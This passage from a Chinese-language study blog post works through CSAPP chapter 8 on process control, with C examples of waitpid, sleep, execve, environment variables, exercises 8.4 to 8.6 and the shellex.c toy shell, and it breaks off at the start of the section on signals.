     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        waitpid(<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c&quot;</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/06/11/mK6DnhsxCRkGMU2.png" alt="image-20220611011515337"></p><p><strong>5.wait 函数</strong></p><p><code>wait</code>函数时<code>waitpid</code>函数的简单版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">wait</span><span class="hljs-params">(<span class="hljs-type">int</span> *statusp)</span>;<br></code></pre></td></tr></table></figure><p>调用<code>wait(&amp;status)</code>等价于调用<code>waitpid(-1，&amp;status，0)</code></p><p><strong>6. 使用waitpid的示例</strong></p><p><strong>waitpid1.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 2</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unix_error</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s:%s\n&quot;</span>,msg,strerror(errno));<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">pid_t</span> pid;<br><span class="hljs-keyword">if</span>((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br><span class="hljs-keyword">return</span> pid;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> status,i;<br><span class="hljs-type">pid_t</span> pid;<br><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; N;i++) <span class="hljs-comment">//fork两个子进程</span><br><span class="hljs-keyword">if</span>((pid = Fork()) == <span class="hljs-number">0</span>)<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">100</span>+i); <span class="hljs-comment">//退出状态</span><br><br><span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;status,<span class="hljs-number">0</span>)) &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//等到任意进程终止</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pid:%d\n&quot;</span>,pid);<br><span class="hljs-keyword">if</span>(WIFEXITED(status)) <span class="hljs-comment">//调用exit函数退出则执行</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chid %d terminated normally with exit status=%d\n&quot;</span>,pid,WEXITSTATUS(status));<span class="hljs-comment">//打印终止的进程ID即状态号</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child %d terminated abnormally\n&quot;</span>,pid);<br>&#125;<br><br><span class="hljs-keyword">if</span> (errno != ECHILD)<br>unix_error(<span class="hljs-string">&quot;waitpid error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>waitpid2.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N  2</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unix_error</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s:%s\n&quot;</span>,msg,strerror(errno));<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">pid_t</span> pid;<br><span class="hljs-keyword">if</span>((pid = fork()) &lt; <span class="hljs-number">0</span> )<br>unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br><span class="hljs-keyword">return</span> pid;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> status,i;<br><span class="hljs-type">pid_t</span> pid[N], retpid;<br><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; N; i++)<br><span class="hljs-keyword">if</span>((pid[i] = Fork()) == <span class="hljs-number">0</span>)<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">100</span>+i);<br><br>i = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//pid &gt; 0 等待指定的子进程退出</span><br><span class="hljs-keyword">while</span> ((retpid = waitpid(pid[i++], &amp;status,<span class="hljs-number">0</span>)) &gt; <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">if</span> (WIFEXITED(status))<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child %d terminated normally with exit status=%d\n&quot;</span>,retpid,WEXITSTATUS(status));<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child %d terminated abnormally\n&quot;</span>,retpid); <br>&#125;<br><span class="hljs-keyword">if</span>(errno != ECHILD)<br>unix_error(<span class="hljs-string">&quot;waitpid error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>练习题8.4</strong></p><p>考虑下面的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello\n&quot;</span>);<br>    pid = Fork();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,!pid);<br>    <span class="hljs-keyword">if</span>(pid != <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span> (waitpid(<span class="hljs-number">-1</span>,&amp;status,<span class="hljs-number">0</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span>(WIFEXITED(status)!=<span class="hljs-number">0</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,WEXITSTATUS(status));<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bye\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>A.这个程序会产生多少输出行</p><p><img src="https://s2.loli.net/2022/06/11/uhPyHwYE9d5evgf.png" alt="image-20220611121332443"></p><p>B.这些输出行的一种可能顺序是什么？</p><h3 id="8-4-4-让进程休眠"><a href="#8-4-4-让进程休眠" class="headerlink" title="8.4.4 让进程休眠"></a>8.4.4 让进程休眠</h3><p><code>sleep</code>函数将一个进程挂起一段指定的时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> secs)</span>;<br></code></pre></td></tr></table></figure><p>若请求时间到了，<code>sleep</code>返回<code>0</code>，否则返回还剩下的要休眠的秒数。<code>sleep</code>函数有可能会被信号中断过早地返回。</p><p><code>pause</code>函数让调用函数休眠，直到该进程收到一个信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pause</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p><strong>练习题8.5</strong></p><p>编写一个<code>sleep</code>地包装函数，叫做<code>snooze</code>，带有下面地接口：</p><p><code>unsigned int snooze(unsigned int secs)</code>;</p><p><code>snooze</code>函数和<code>sleep</code>函数地行为完全一样，除了它会打印出一条消息来描述进程实际休眠了多长时间：</p><p>Slept for 4 of secs.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">snooze</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> secs)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rc = sleep(secs);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Slept for %d of %d secs\n&quot;</span>,secs - rc, secs);<br><span class="hljs-keyword">return</span> rc;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rc;<br>rc = snooze(<span class="hljs-number">5</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-4-5-加载并运行程序"><a href="#8-4-5-加载并运行程序" class="headerlink" title="8.4.5 加载并运行程序"></a>8.4.5 加载并运行程序</h3><p><code>execve</code>函数在当前进程地上下文中加载并运行一个新程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[], <span class="hljs-type">const</span> <span class="hljs-type">char</span> *envp[])</span>;<br><span class="hljs-comment">//成功则不返回，错误则返回-1</span><br></code></pre></td></tr></table></figure><p><code>execve</code>调用一次并不返回</p><p>当<code>main</code>函数开始执行时，用户栈地组织结构为下图</p><p><code>int main(int argc, char **argv, char **envp);</code></p><p><code>int main(int argc,char *argv[], char *envp[]);</code></p><p><code>main</code>函数有3个参数</p><ol><li><code>argc</code>，指的是<code>argv[]</code>数组中非空指针地数量</li><li><code>argv</code>，指向<code>argv[]</code>数组中的第一个条目</li><li><code>envp</code>，指向<code>envp[]</code>数组中的第一条目</li></ol><p><code>Linux</code>用于操作环境数组的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">getenv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">//返回：若存在则为指向name的指针，若无匹配的，则为NULL</span><br></code></pre></td></tr></table></figure><p><code>getenv</code>函数在环境数组中搜索字符串<code>name =  value</code>。如果找到返回指向<code>value</code>的指针，否则返回<code>NULL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setenv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *newvalue, <span class="hljs-type">int</span> overwrite)</span>;<br><span class="hljs-comment">//返回：若成功则为0，若错误则为-1</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unsetenv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">//返回：无</span><br></code></pre></td></tr></table></figure><p>如果环境数组包含一个形如<code>name = oldvalue</code>的字符串，那么<code>unsetenv</code>会删除指定键值对，而使用<code>setenv</code>会使用<code>newvalue</code>代替<code>oldvalue</code>，但是只有在<code>overwrite</code>为非零时才会覆盖。</p><p>如果<code>name</code>不存在，那么<code>setenv</code>酒吧<code>name = new value</code>添加到数组中。</p><p>程序与进程的区别</p><ul><li>程序是一堆代码和数据，作为目标文件存在于磁盘上。进程则是执行程序的实例。</li><li>程序是运行在进程的上下文中的</li></ul><p><strong>练习题8.6</strong></p><p>编写一个叫做<code>myecho</code>的程序，打印出它的命令行参数和环境变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[],<span class="hljs-type">char</span> *envp[])</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Command-ine arguments:&quot;</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argv[ %d]: %s\n&quot;</span>,i,argv[i]);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enviroment variables:&quot;</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(envp); i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;envp[ %d]: %s\n&quot;</span>,i,envp[i]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/06/11/TwRvgDjtkzSObxo.png" alt="image-20220611170151025"></p><p>课后答案</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[],<span class="hljs-type">char</span> *envp[])</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Command-ine arguments:&quot;</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; argv[i] != <span class="hljs-literal">NULL</span>; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argv[%2d]: %s\n&quot;</span>,i,argv[i]);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Environment variables:&quot;</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; envp[i] != <span class="hljs-literal">NULL</span>; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;envp[%2d]: %s\n&quot;</span>,i,envpc[i]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-4-6-利用fork和execve运行程序"><a href="#8-4-6-利用fork和execve运行程序" class="headerlink" title="8.4.6 利用fork和execve运行程序"></a>8.4.6 利用fork和execve运行程序</h3><p><strong>shellex.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -o shellex shellex.c csapp.c -lpthread</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXARGS 128</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">parseline</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">char</span> **argv)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_command</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> cmdline[MAXLINE];<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>Fgets(cmdline,MAXLINE,<span class="hljs-built_in">stdin</span>);<span class="hljs-comment">//输入命令</span><br><span class="hljs-keyword">if</span>(feof(<span class="hljs-built_in">stdin</span>))<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>eval(cmdline);<span class="hljs-comment">//解析命令</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span><br>&#123;<br><span class="hljs-type">char</span> *argv[MAXARGS];<br><span class="hljs-type">char</span> buf[MAXLINE];<br><span class="hljs-type">int</span> bg;<br><span class="hljs-type">pid_t</span> pid;<br><br><span class="hljs-built_in">strcpy</span>(buf,cmdline);<span class="hljs-comment">//将命令拷贝到buf数组中</span><br>bg = parseline(buf,argv);<span class="hljs-comment">//解析命令，将空格转换为截断符，将转换后的命令放在argv中</span><br><span class="hljs-keyword">if</span>( argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span>(!builtin_command(argv))&#123;<br><span class="hljs-keyword">if</span>((pid = Fork()) == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">if</span>(execve(argv[<span class="hljs-number">0</span>],argv,environ) &lt; <span class="hljs-number">0</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!bg)&#123;<br><span class="hljs-type">int</span> status;<br><span class="hljs-keyword">if</span> (waitpid(pid,&amp;status,<span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br>unix_error(<span class="hljs-string">&quot;waitfd: waitpid error&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %s&quot;</span>,pid,cmdline);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_command</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;quit&quot;</span>))<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;&amp;&quot;</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">parseline</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-type">char</span> *delim;<br><span class="hljs-type">int</span> argc;<br><span class="hljs-type">int</span> bg;<br><br>buf[<span class="hljs-built_in">strlen</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27; &#x27;</span>; <span class="hljs-comment">//末尾改为空格</span><br><span class="hljs-keyword">while</span>(*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">//跳过空格</span><br>buf++;<br>argc = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//定位空格位置</span><br><span class="hljs-keyword">while</span>((delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>)))&#123;<br>argv[argc++] = buf;<br>*delim = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>buf = delim + <span class="hljs-number">1</span>; <span class="hljs-comment">//跳过空格</span><br><span class="hljs-keyword">while</span>(*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">//避免参数之间含有多个空格，空格全跳过</span><br>buf++;<br>&#125;<br>argv[argc] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>((bg = (*argv[argc<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;&amp;&#x27;</span>)) != <span class="hljs-number">0</span>)<span class="hljs-comment">//判断最后一个字符是否为&amp;，若是则后台运行进程</span><br>argv[--argc] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> bg;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-5-信号"><a href="#8-5-信号" class="headerlink" title="8.5 信号"></a>8.5 信号</h2><p><code>Linux</code>信号允许进程和内核中断其他进程。</p><p>底层硬件异常由内核异常处理程序处理，用户程进程不可见。因此信号提供一种机制，可以通知用户进程发生了异常。</p><p><img src="https://s2.loli.net/2022/06/11/RDeNJFgmjy2tu6O.png" 